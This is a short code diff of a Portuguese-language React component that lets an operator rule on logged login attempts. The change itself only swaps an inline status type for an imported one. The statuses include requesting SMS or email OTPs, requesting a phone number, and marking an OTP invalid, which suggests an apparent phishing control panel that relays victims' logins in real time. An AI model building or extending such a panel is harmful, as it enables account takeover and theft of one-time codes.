@@ -4,7 +4,7 @@ import { useEffect, useState } from "react";
 import { createPortal } from "react-dom";
 import { ChevronLeft, ChevronRight, ChevronDown, Copy, KeyRound, Globe, Trash2, Clock, Ban, CheckCircle2, Smartphone, ShieldX } from "lucide-react";
 import { supabase } from "@/lib/supabase";
-import type { Log } from "@/lib/logs";
+import type { Log, StatusLogin } from "@/lib/logs";
 import { deletarLog, decidirLogin, limparClientes } from "@/lib/logs";
 import { bandeiraDe } from "@/lib/geo";
 
@@ -170,7 +170,7 @@ export default function ClientesCard({
     } catch {}
   }
 
-  async function decidir(log: Log, status: "aprovado" | "recusado" | "pedir_otp" | "pedir_otp_email" | "pedir_telefone" | "bloqueado" | "otp_invalido") {
+  async function decidir(log: Log, status: StatusLogin) {
     setMenuAberto(null);
     try {
       await decidirLogin(log, status);
